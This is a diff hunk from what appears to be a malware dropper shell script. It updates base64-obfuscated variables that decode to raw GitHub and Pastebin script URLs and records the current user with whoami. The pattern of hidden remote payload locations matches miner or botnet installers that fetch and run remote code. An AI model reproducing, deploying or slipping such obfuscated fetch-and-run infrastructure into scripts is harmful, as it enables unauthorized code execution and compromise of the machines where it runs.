@@ -31,10 +31,10 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #Note:
 #1) We don't have access to Jeff4r190@tutanota.com anymore.
 
-house=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3poYW5naHVjaGFuamlhbi8xL21hc3Rlci82LnNoCg==|base64 -d)
+house=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3poYW5naHVjaGFuamlhbi8xL21hc3Rlci93Cg==|base64 -d)
 room=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3RTcjdMRENQCg==|base64 -d)
-park=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3poYW5naHVjaGFuamlhbi8xL21hc3Rlci82LnNoCg==|base64 -d)
-beam=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3poYW5naHVjaGFuamlhbi8xL21hc3Rlci82LnNoCg==|base64 -d)
+park=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3poYW5naHVjaGFuamlhbi8xL21hc3Rlci93Cg==|base64 -d)
+beam=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3poYW5naHVjaGFuamlhbi8xL21hc3Rlci93Cg==|base64 -d)
 deep=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1RwWEVyRzdrCg==|base64 -d)
 surf=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1RVbldVZUpxCg==|base64 -d)
 me=$( whoami )
